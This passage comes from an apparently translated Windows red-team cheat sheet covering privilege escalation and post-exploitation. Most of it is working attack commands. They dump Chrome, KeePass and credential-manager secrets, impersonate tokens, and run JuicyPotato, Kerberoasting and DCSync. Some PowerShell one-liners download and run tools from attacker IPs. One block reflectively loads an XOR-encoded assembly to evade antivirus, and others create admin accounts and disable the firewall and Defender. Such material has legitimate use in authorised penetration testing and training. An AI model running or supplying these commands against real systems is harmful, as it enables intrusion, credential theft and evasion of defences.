2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line"></span><br><span class="line">Modify Permissions for Everyone on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br></pre></td></tr></table></figure><h2 id="4-9-计划任务"><a href="#4-9-计划任务" class="headerlink" title="4.9 计划任务"></a>4.9 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h2 id="4-10-Powershell历史"><a href="#4-10-Powershell历史" class="headerlink" title="4.10 Powershell历史"></a>4.10 Powershell历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br></pre></td></tr></table></figure><h2 id="4-12-查看已连接的驱动器"><a href="#4-12-查看已连接的驱动器" class="headerlink" title="4.12 查看已连接的驱动器"></a>4.12 查看已连接的驱动器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">wmic logicaldisk get caption,description</span><br><span class="line"></span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br></pre></td></tr></table></figure><h2 id="4-13-查看隐私"><a href="#4-13-查看隐私" class="headerlink" title="4.13 查看隐私"></a>4.13 查看隐私</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">Look for SeImpersonate, SeDebugPrivilege etc</span><br></pre></td></tr></table></figure><h2 id="4-14-还有其他人登录吗？"><a href="#4-14-还有其他人登录吗？" class="headerlink" title="4.14 还有其他人登录吗？"></a>4.14 还有其他人登录吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure><h2 id="4-15-查看注册表自动登录"><a href="#4-15-查看注册表自动登录" class="headerlink" title="4.15 查看注册表自动登录"></a>4.15 查看注册表自动登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><span class="line"></span><br><span class="line">Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot;</span><br></pre></td></tr></table></figure><h2 id="4-16-在凭据管理器中查看存储的凭据"><a href="#4-16-在凭据管理器中查看存储的凭据" class="headerlink" title="4.16 在凭据管理器中查看存储的凭据"></a>4.16 在凭据管理器中查看存储的凭据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure><h2 id="4-17-查看未引用的服务路径"><a href="#4-17-查看未引用的服务路径" class="headerlink" title="4.17 查看未引用的服务路径"></a>4.17 查看未引用的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name</span><br></pre></td></tr></table></figure><h2 id="4-18-查看启动项"><a href="#4-18-查看启动项" class="headerlink" title="4.18 查看启动项"></a>4.18 查看启动项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><h2 id="4-19-检查AlwaysInstalledElevated注册表项"><a href="#4-19-检查AlwaysInstalledElevated注册表项" class="headerlink" title="4.19 检查AlwaysInstalledElevated注册表项"></a>4.19 检查AlwaysInstalledElevated注册表项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><h2 id="4-20-注册表中有密码吗？"><a href="#4-20-注册表中有密码吗？" class="headerlink" title="4.20 注册表中有密码吗？"></a>4.20 注册表中有密码吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-21-剩余的任何Sysrep或无人参与文件"><a href="#4-21-剩余的任何Sysrep或无人参与文件" class="headerlink" title="4.21 剩余的任何Sysrep或无人参与文件"></a>4.21 剩余的任何Sysrep或无人参与文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-22-GPP（组策略首选项）密码"><a href="#4-22-GPP（组策略首选项）密码" class="headerlink" title="4.22 GPP（组策略首选项）密码"></a>4.22 GPP（组策略首选项）密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan</span><br><span class="line"></span><br><span class="line">\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\</span><br><span class="line"></span><br><span class="line">http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption</span><br><span class="line"></span><br><span class="line">Can also use PowerUP.ps1</span><br></pre></td></tr></table></figure><h2 id="4-23-转储Chrome密码（也发布漏洞利用程序）"><a href="#4-23-转储Chrome密码（也发布漏洞利用程序）" class="headerlink" title="4.23 转储Chrome密码（也发布漏洞利用程序）"></a>4.23 转储Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="4-24-转储KeePass"><a href="#4-24-转储KeePass" class="headerlink" title="4.24 转储KeePass"></a>4.24 转储KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="4-25-令牌模拟"><a href="#4-25-令牌模拟" class="headerlink" title="4.25 令牌模拟"></a>4.25 令牌模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;</span><br><span class="line">Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)</span><br><span class="line"></span><br><span class="line">#Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><span class="line"></span><br><span class="line">Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...</span><br><span class="line">$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;</span><br><span class="line">[System.Reflection.Assembly]::Load($b) | Out-Null</span><br><span class="line">$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)</span><br><span class="line">[namespace.Class]::Main($parameters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</span><br></pre></td></tr></table></figure><h2 id="4-26-多汁土豆"><a href="#4-26-多汁土豆" class="headerlink" title="4.26 多汁土豆"></a>4.26 多汁土豆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><span class="line"></span><br><span class="line">#Reference https://ohpe.it/juicy-potato/</span><br><span class="line"></span><br><span class="line">Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege</span><br><span class="line"></span><br><span class="line">(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)</span><br><span class="line"></span><br><span class="line">JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br><span class="line"></span><br><span class="line">Mochan.exe = Payload</span><br><span class="line">5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD</span><br><span class="line"></span><br><span class="line">A CLSID is a GUID that identifies a COM class object</span><br><span class="line"></span><br><span class="line">Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc</span><br><span class="line"></span><br><span class="line">JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</span><br></pre></td></tr></table></figure><h2 id="4-27-烧烤"><a href="#4-27-烧烤" class="headerlink" title="4.27 烧烤"></a>4.27 烧烤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat</span><br><span class="line"></span><br><span class="line">because Hashcat over John anyday right?</span><br><span class="line"></span><br><span class="line">Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount</span><br><span class="line"></span><br><span class="line">Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.</span><br><span class="line"></span><br><span class="line">https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</span><br></pre></td></tr></table></figure><h2 id="4-28-用Python编写的"><a href="#4-28-用Python编写的" class="headerlink" title="4.28 用Python编写的"></a>4.28 用Python编写的</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/kerberoast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMPORTANT: the accepted formats are the following</span><br><span class="line">&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line">&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Look for vulnerable users via LDAP</span><br><span class="line">kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum</span><br><span class="line"></span><br><span class="line">Use ASREP roast against users in the ldapenum_asrep_users.txt file</span><br><span class="line">kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt</span><br><span class="line"></span><br><span class="line">Use SPN roast against users in the ldapenum_spn_users.txt file</span><br><span class="line">kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</span><br></pre></td></tr></table></figure><h2 id="4-29-代表烘焙"><a href="#4-29-代表烘焙" class="headerlink" title="4.29 代表烘焙"></a>4.29 代表烘焙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable</span><br><span class="line"></span><br><span class="line">Get-ASRepHash -Domain m0chanAD.local -User victim</span><br><span class="line"></span><br><span class="line">Can also use Rebeus (Reflectively Load .NET Assembly.)</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><h2 id="4-30DCSync（也用于后期利用）"><a href="#4-30DCSync（也用于后期利用）" class="headerlink" title="4.30DCSync（也用于后期利用）"></a>4.30DCSync（也用于后期利用）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. </span><br><span class="line"></span><br><span class="line">#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator</span><br><span class="line"></span><br><span class="line">powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure><h1 id="0x05-exploit后"><a href="#0x05-exploit后" class="headerlink" title="0x05 exploit后"></a>0x05 exploit后</h1><h2 id="5-1-有用的命令"><a href="#5-1-有用的命令" class="headerlink" title="5.1 有用的命令"></a>5.1 有用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net localgroup Administrators m0chan /add</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Turn firewall off</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">Or like this</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">If you get this error:</span><br><span class="line"></span><br><span class="line">CredSSP Error Fix -&gt;</span><br><span class="line"></span><br><span class="line">Add this reg key:</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Disable Windows Defender</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h2 id="5-2-Esenutl-exe转储锁定文件"><a href="#5-2-Esenutl-exe转储锁定文件" class="headerlink" title="5.2 Esenutl.exe转储锁定文件"></a>5.2 Esenutl.exe转储锁定文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</span><br></pre></td></tr></table></figure><h2 id="5-3-检查是否已启用Powershell日志记录"><a href="#5-3-检查是否已启用Powershell日志记录" class="headerlink" title="5.3 检查是否已启用Powershell日志记录"></a>5.3 检查是否已启用Powershell日志记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure><h2 id="5-4-Run-Seatbelt（绝对必须）"><a href="#5-4-Run-Seatbelt（绝对必须）" class="headerlink" title="5.4 Run Seatbelt（绝对必须）"></a>5.4 Run Seatbelt（绝对必须）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/Seatbelt</span><br><span class="line"></span><br><span class="line">This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win</span><br><span class="line"></span><br><span class="line">BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)</span><br><span class="line">RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13</span><br><span class="line">TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)</span><br><span class="line">UACSystemPolicies     -   UAC system policies via the registry</span><br><span class="line">PowerShellSettings    -   PowerShell versions and security settings</span><br><span class="line">AuditSettings         -   Audit settings via the registry</span><br><span class="line">WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry</span><br><span class="line">LSASettings           -   LSA settings (including auth packages)</span><br><span class="line">UserEnvVariables      -   Current user environment variables</span><br><span class="line">SystemEnvVariables    -   Current system environment variables</span><br><span class="line">UserFolders           -   Folders in C:\Users\</span><br><span class="line">NonstandardServices   -   Services with file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">InternetSettings      -   Internet settings including proxy configs</span><br><span class="line">LapsSettings          -   LAPS settings, if installed</span><br><span class="line">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="line">MappedDrives          -   Mapped drives</span><br><span class="line">RDPSessions           -   Current incoming RDP sessions</span><br><span class="line">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="line">NetworkShares         -   Network shares</span><br><span class="line">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="line">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="line">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="line">RegistryAutoRuns      -   Registry autoruns</span><br><span class="line">RegistryAutoLogon     -   Registry autologon information</span><br><span class="line">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="line">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="line">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="line">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="line">NonstandardProcesses  -   Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">  *  If the user is in high integrity, the following additional actions are run:</span><br><span class="line">SysmonConfig          -   Sysmon configuration from the registry</span><br><span class="line"></span><br><span class="line">And more!!</span><br></pre></td></tr></table></figure><h2 id="5-5-Dump-Creds"><a href="#5-5-Dump-Creds" class="headerlink" title="5.5 Dump Creds"></a>5.5 Dump Creds</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz </span><br><span class="line"></span><br><span class="line">Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span 